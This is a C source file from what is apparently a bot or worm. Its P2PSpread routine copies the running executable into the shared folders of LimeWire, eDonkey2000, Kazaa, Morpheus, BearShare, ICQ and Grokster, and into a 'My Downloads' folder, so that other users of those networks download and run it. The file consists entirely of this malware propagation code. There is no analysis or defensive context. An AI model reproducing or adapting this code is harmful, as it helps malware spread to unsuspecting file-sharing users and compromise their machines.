#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_P2P

void LimeWireInit(char *botfile) 
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\LimeWire\\Shared");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void eDonkey2KInit(char *botfile) 
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\eDonkey2000\\incoming");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void KazaaInit(char *botfile)

{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\KAZAA");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void MorpheusInit(char *botfile)

{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\Morpheus\\My Shared Folder\\");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void BearShareInit(char *botfile)

{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\BearShare\\Shared\\");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void ICQInit(char *botfile)

{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\ICQ\\Shared Files\\");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void GroksterInit(char *botfile)

{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\Grokster\\My Grokster\\");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void mydlsInit(char *botfile)

{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\My Downloads\\");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void P2PSpread(void) 
{
	char botfile[MAX_PATH];
	GetModuleFileName(NULL, botfile, sizeof(botfile));
	LimeWireInit(botfile);
	eDonkey2KInit(botfile);
	KazaaInit(botfile);
	MorpheusInit(botfile);
	BearShareInit(botfile);
	ICQInit(botfile);
	GroksterInit(botfile);
	mydlsInit(botfile);

	return;
}
#endif